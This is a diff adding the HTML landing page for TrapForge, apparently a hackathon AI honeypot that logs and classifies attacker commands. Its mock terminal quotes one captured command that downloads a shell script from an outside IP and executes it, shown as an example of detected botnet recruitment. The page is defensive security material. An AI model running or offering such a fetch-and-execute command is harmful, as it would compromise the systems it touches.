@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+
+<html class="dark" lang="en"><head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>TRAPFORGE | Architecture &amp; Deployment</title>
+<script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&amp;family=Space+Grotesk:wght@300;400;500;600;700&amp;display=swap" rel="stylesheet"/>
+<link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&amp;display=swap" rel="stylesheet"/>
+<link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&amp;display=swap" rel="stylesheet"/>
+<script id="tailwind-config">
+        tailwind.config = {
+            darkMode: "class",
+            theme: {
+                extend: {
+                    "colors": {
+                        "background": "#131313",
+                        "inverse-surface": "#e5e2e1",
+                        "error-container": "#93000a",
+                        "on-secondary-fixed-variant": "#832600",
+                        "secondary-container": "#b83900",
+                        "primary-fixed": "#60ff99",
+                        "on-primary-fixed-variant": "#005228",
+                        "primary-container": "#00ff88",
+                        "on-secondary-fixed": "#390c00",
+                        "tertiary": "#fffafb",
+                        "on-secondary-container": "#ffddd2",
+                        "inverse-primary": "#006d37",
+                        "surface": "#131313",
+                        "on-tertiary-fixed": "#2c0051",
+                        "surface-tint": "#00e479",
+                        "secondary-fixed": "#ffdbd0",
+                        "surface-dim": "#131313",
+                        "surface-container-lowest": "#0e0e0e",
+                        "secondary": "#ffb59d",
+                        "primary-fixed-dim": "#00e479",
+                        "inverse-on-surface": "#313030",
+                        "surface-container-low": "#1c1b1b",
+                        "on-error": "#690005",
+                        "on-tertiary-fixed-variant": "#6900b3",
+                        "secondary-fixed-dim": "#ffb59d",
+                        "primary": "#f1ffef",
+                        "error": "#ffb4ab",
+                        "on-tertiary": "#490080",
+                        "tertiary-fixed-dim": "#ddb7ff",
+                        "surface-container-highest": "#353534",
+                        "surface-variant": "#353534",
+                        "on-primary-fixed": "#00210c",
+                        "tertiary-fixed": "#f0dbff",
+                        "on-surface": "#e5e2e1",
+                        "on-secondary": "#5d1900",
+                        "on-tertiary-container": "#8830d6",
+                        "on-surface-variant": "#b9cbb9",
+                        "surface-container": "#201f1f",
+                        "on-primary": "#003919",
+                        "on-background": "#e5e2e1",
+                        "tertiary-container": "#eed6ff",
+                        "surface-container-high": "#2a2a2a",
+                        "on-primary-container": "#007139",
+                        "outline-variant": "#3b4b3d",
+                        "on-error-container": "#ffdad6",
+                        "surface-bright": "#3a3939",
+                        "outline": "#849585"
+                    },
+                    "borderRadius": {
+                        "DEFAULT": "0.25rem",
+                        "lg": "0.5rem",
+                        "xl": "0.75rem",
+                        "full": "9999px"
+                    },
+                    "fontFamily": {
+                        "headline": ["Inter"],
+                        "body": ["Inter"],
+                        "label": ["Space Grotesk"]
+                    }
+                },
+            },
+        }
+    </script>
+<style>
+        .material-symbols-outlined {
+            font-variation-settings: 'FILL' 0, 'wght' 400, 'GRAD' 0, 'opsz' 24;
+        }
+        .glow-border {
+            box-shadow: 0 0 12px rgba(0, 255, 136, 0.2);
+        }
+        .notched-card {
+            border-top-left-radius: 6px;
+            border-bottom-right-radius: 6px;
+            border-top-right-radius: 0;
+            border-bottom-left-radius: 0;
+        }
+        .terminal-cursor {
+            display: inline-block;
+            width: 8px;
+            height: 15px;
+            background-color: #00ff88;
+            margin-left: 4px;
+            animation: blink 1s step-end infinite;
+        }
+        @keyframes blink {
+            50% { opacity: 0; }
+        }
+        .flicker:active {
+            animation: flicker-animation 0.05s infinite;
+        }
+        @keyframes flicker-animation {
+            0% { opacity: 0.8; }
+            100% { opacity: 1; }
+        }
+    </style>
+</head>
+<body class="bg-surface-dim text-on-surface font-body overflow-x-hidden selection:bg-primary-container selection:text-on-primary-fixed">
+<!-- Top Navigation Anchor -->
+<header class="bg-[#131313] border-b-2 border-[#1c1b1b] docked full-width top-0 z-50">
+<nav class="flex justify-between items-center w-full px-6 py-4 max-w-[1440px] mx-auto">
+<div class="text-2xl font-black tracking-tighter text-[#00ff88] drop-shadow-[0_0_8px_rgba(0,255,136,0.4)] font-headline">TRAPFORGE</div>
+<div class="hidden md:flex items-center gap-8">
+<a class="text-[#849585] hover:text-[#00ff88] transition-colors duration-100 font-['Inter'] font-semibold tracking-tighter uppercase text-sm" href="#">INTEL</a>
+<a class="text-[#00ff88] border-b-2 border-[#00ff88] pb-1 font-['Inter'] font-semibold tracking-tighter uppercase text-sm" href="#how-it-works">ARCHITECTURE</a>
+<a class="text-[#849585] hover:text-[#00ff88] transition-colors duration-100 font-['Inter'] font-semibold tracking-tighter uppercase text-sm" href="#">DEPLOY</a>
+<a class="text-[#849585] hover:text-[#00ff88] transition-colors duration-100 font-['Inter'] font-semibold tracking-tighter uppercase text-sm" href="#">RESOURCES</a>
+</div>
+<div class="flex items-center gap-4">
+<button class="material-symbols-outlined text-outline hover:text-primary-container transition-colors">terminal</button>
+<button class="material-symbols-outlined text-outline hover:text-primary-container transition-colors">security</button>
+<button class="bg-primary-container text-on-primary-fixed px-4 py-2 font-headline font-semibold text-xs tracking-tighter uppercase flicker transition-all duration-75 active:scale-95">INITIALIZE_SESSION</button>
+</div>
+</nav>
+</header>
+<main class="min-h-screen">
+<!-- HOW IT WORKS SECTION -->
+<section class="py-24 px-6 md:px-12 bg-surface" id="how-it-works">
+<div class="max-w-[1440px] mx-auto">
+<!-- Section Header -->
+<div class="text-center mb-20">
+<p class="font-label text-xs tracking-[0.2em] text-outline uppercase mb-4">ARCHITECTURE</p>
+<h2 class="font-headline text-4xl md:text-6xl font-bold text-on-surface tracking-tighter">From First Probe to Full Intelligence</h2>
+</div>
+<!-- Steps Flow -->
+<div class="relative grid grid-cols-1 md:grid-cols-3 gap-12 mb-24">
+<!-- Step 01 -->
+<div class="relative group">
+<div class="bg-surface-container-low p-8 border border-outline-variant notched-card hover:border-primary-container/50 transition-colors duration-300">
+<span class="font-label text-4xl font-bold text-primary-fixed-dim/30 mb-6 block">01</span>
+<h3 class="font-headline text-xl font-bold text-on-surface mb-3">Attacker Connects</h3>
+<p class="text-on-surface-variant text-sm leading-relaxed mb-6">A real attacker or scanner hits one of 5 open honeypot ports. TrapForge serves a convincing service banner and interactive shell prompt.</p>
+<div class="font-label text-[10px] tracking-widest text-primary-fixed border border-primary-fixed/20 px-3 py-1 inline-block uppercase">
+                                [SSH · FTP · HTTP · MySQL · SMTP]
+                            </div>
+</div>
+<!-- Connector Arrow -->
+<div class="hidden md:block absolute top-1/2 -right-6 translate-x-1/2 -translate-y-1/2 z-10 text-primary-container/20">
+<span class="material-symbols-outlined text-4xl">double_arrow</span>
+</div>
+</div>
+<!-- Step 02 -->
+<div class="relative group">
+<div class="bg-surface-container-low p-8 border border-outline-variant notched-card hover:border-primary-container/50 transition-colors duration-300">
+<span class="font-label text-4xl font-bold text-primary-fixed-dim/30 mb-6 block">02</span>
+<h3 class="font-headline text-xl font-bold text-on-surface mb-3">AI Classifies Intent</h3>
+<p class="text-on-surface-variant text-sm leading-relaxed mb-6">Every command is vectorized and run through the ML classifier. Intent label, severity score, MITRE ATT&amp;CK tag, and confidence assigned in &lt;50ms.</p>
+<div class="font-label text-[10px] tracking-widest text-primary-fixed border border-primary-fixed/20 px-3 py-1 inline-block uppercase">
+                                [10 intent classes · &lt;50ms]
+                            </div>
+</div>
+<!-- Connector Arrow -->
+<div class="hidden md:block absolute top-1/2 -right-6 translate-x-1/2 -translate-y-1/2 z-10 text-primary-container/20">
+<span class="material-symbols-outlined text-4xl">double_arrow</span>
+</div>
+</div>
+<!-- Step 03 -->
+<div class="relative group">
+<div class="bg-surface-container-low p-8 border border-outline-variant notched-card hover:border-primary-container/50 transition-colors duration-300">
+<span class="font-label text-4xl font-bold text-primary-fixed-dim/30 mb-6 block">03</span>
+<h3 class="font-headline text-xl font-bold text-on-surface mb-3">Intelligence Deployed</h3>
+<p class="text-on-surface-variant text-sm leading-relaxed mb-6">Event stored, broadcast live to the dashboard, Telegram alert fired, attacker profile built. Full kill chain reconstructed.</p>
+<div class="font-label text-[10px] tracking-widest text-primary-fixed border border-primary-fixed/20 px-3 py-1 inline-block uppercase">
+                                [Real-time · Automated]
+                            </div>
+</div>
+</div>
+</div>
+<!-- Terminal Block -->
+<div class="w-full max-w-4xl mx-auto">
+<div class="bg-[#0d0d0d] border border-outline-variant rounded-md overflow-hidden shadow-2xl">
+<!-- Terminal Header -->
+<div class="bg-surface-container-highest px-4 py-2 flex items-center justify-between border-b border-outline-variant/30">
+<div class="flex gap-2">
+<div class="w-3 h-3 rounded-full bg-error"></div>
+<div class="w-3 h-3 rounded-full bg-secondary"></div>
+<div class="w-3 h-3 rounded-full bg-primary-container"></div>
+</div>
+<div class="font-label text-[11px] text-outline uppercase tracking-tight">trap_forge@honeypot — ssh — 80×24</div>
+<div class="w-12"></div>
+</div>
+<!-- Terminal Body -->
+<div class="p-6 font-mono text-[13px] leading-relaxed min-h-[320px]">
+<div class="mb-2">
+<span class="text-primary-container">trap_forge@intel:~$</span>
+<span class="text-on-surface"> ./analyze_session --id=TF-9842</span>
+</div>
+<div class="text-outline mb-1">↳ Loading vectorized command stream...</div>
+<div class="text-outline mb-3">↳ Cross-referencing MITRE ATT&amp;CK Framework...</div>
+<div class="grid grid-cols-[120px_1fr] gap-x-4 gap-y-1 mb-4">
+<div class="text-outline uppercase text-[11px]">Timestamp:</div>
+<div class="text-on-surface">2024-10-24 14:22:01.042</div>
+<div class="text-outline uppercase text-[11px]">Source_IP:</div>
+<div class="text-on-surface">194.165.16.241 (RU / Moscow)</div>
+<div class="text-outline uppercase text-[11px]">Command:</div>
+<div class="text-on-surface italic">"wget http://62.113.112.11/bin.sh; chmod +x bin.sh; ./bin.sh"</div>
+</div>
+<div class="mb-4 border-l-2 border-primary-container/20 pl-4 py-1">
+<div class="flex items-center gap-3 mb-1">
+<span class="bg-[#ff6b35]/20 text-[#ff6b35] px-2 py-0.5 text-[10px] font-bold">CRITICAL</span>
+<span class="text-on-surface font-bold text-primary-container">INTENT DETECTED: BOTNET_RECRUITMENT</span>
+</div>
+<div class="text-outline">Score: 0.9882 · Confidence: HIGH · Tag: T1105 (Ingress Tool Transfer)</div>
+</div>
+<div class="mb-2">
+<span class="text-primary-container">trap_forge@intel:~$</span>
+<span class="text-[#f59e0b] px-2">ALERT_FIRED: Telegram push sent to Admin.</span>
+</div>
+<div class="text-outline">↳ Output path: <span class="text-[#4b5563]">/var/log/trapforge/sessions/TF-9842.json</span></div>
+<div class="flex items-center">
+<span class="text-primary-container">trap_forge@intel:~$</span>
+<span class="terminal-cursor"></span>
+</div>
+</div>
+</div>
+</div>
+</div>
+</section>
+<!-- DEPLOY CTA -->
+<section class="relative py-24 bg-[#0d0d0d] overflow-hidden">
+<!-- Tonal Shift Inner Glow -->
+<div class="absolute inset-0 pointer-events-none" style="box-shadow: 0 -1px 40px #00ff8811 inset;"></div>
+<div class="max-w-[1440px] mx-auto px-6 text-center relative z-10">
+<p class="font-label text-sm tracking-[0.3em] text-primary-fixed-dim uppercase mb-6">READY TO DEPLOY?</p>
+<h2 class="font-headline text-5xl md:text-7xl font-black text-on-surface tracking-tighter mb-6">Start Intercepting Real Attackers.</h2>
+<p class="text-outline text-lg md:text-xl max-w-2xl mx-auto mb-12">Self-hosted. No cloud required. Running in under 5 minutes.</p>
+<div class="inline-flex flex-col md:flex-row items-center gap-6">
+<div class="bg-surface-container-lowest border border-outline-variant rounded-full px-6 py-4 flex items-center gap-4 group cursor-text">
+<span class="text-primary-container font-mono">$</span>
+<code class="text-on-surface-variant font-mono text-sm">git clone https://github.com/yourrepo/trapforge &amp;&amp; cd trapforge &amp;&amp; python backend/main.py</code>
+<button class="material-symbols-outlined text-outline group-hover:text-primary-container transition-colors">content_copy</button>
+</div>
+<button class="bg-primary-container text-on-primary-fixed px-10 py-5 font-headline font-extrabold text-lg tracking-tighter uppercase shadow-[0_0_20px_rgba(0,255,136,0.3)] hover:shadow-[0_0_35px_rgba(0,255,136,0.5)] transition-all duration-300 flicker active:scale-95">
+                        Deploy TrapForge →
+                    </button>
+</div>
+</div>
+</section>
+</main>
+<!-- FOOTER -->
+<footer class="bg-[#0e0e0e] border-t-2 border-[#1c1b1b]">
+<div class="flex flex-col md:flex-row justify-between items-center w-full px-12 py-8 gap-4 max-w-[1440px] mx-auto">
+<div class="flex items-center gap-4 text-[#849585] font-['Space_Grotesk'] text-[10px] tracking-[0.05em] uppercase">
+<span class="text-[#00ff88] font-bold">TrapForge</span>
+<span class="opacity-30">|</span>
+<span>AI Honeypot</span>
+<span class="opacity-30">|</span>
+<span>Built for security research</span>
+</div>
+<div class="flex flex-wrap justify-center gap-6">
+<a class="text-[#849585] hover:text-[#00ff88] underline decoration-dotted transition-opacity duration-150 font-['Space_Grotesk'] text-[10px] tracking-[0.05em] uppercase" href="#">OPERATIONS</a>
+<a class="text-[#849585] hover:text-[#00ff88] underline decoration-dotted transition-opacity duration-150 font-['Space_Grotesk'] text-[10px] tracking-[0.05em] uppercase" href="#">DOCUMENTATION</a>
+<a class="text-[#849585] hover:text-[#00ff88] underline decoration-dotted transition-opacity duration-150 font-['Space_Grotesk'] text-[10px] tracking-[0.05em] uppercase" href="#">LEGAL</a>
+<a class="text-[#849585] hover:text-[#00ff88] underline decoration-dotted transition-opacity duration-150 font-['Space_Grotesk'] text-[10px] tracking-[0.05em] uppercase text-[#00ff88]" href="#">STATUS_LIVESTREAM</a>
+</div>
+<div class="text-[#849585] font-['Space_Grotesk'] text-[10px] tracking-[0.05em] uppercase">
+                Made for Hackathon 2025
+            </div>
+</div>
+<div class="w-full text-center py-4 border-t border-[#1c1b1b]/30">
+<p class="font-['Space_Grotesk'] text-[9px] tracking-[0.05em] uppercase text-outline/50">©2024 TRAPFORGE SYSTEMS - TACTICAL ENCRYPTION PROTOCOL</p>
+</div>
+</footer>
+</body></html>
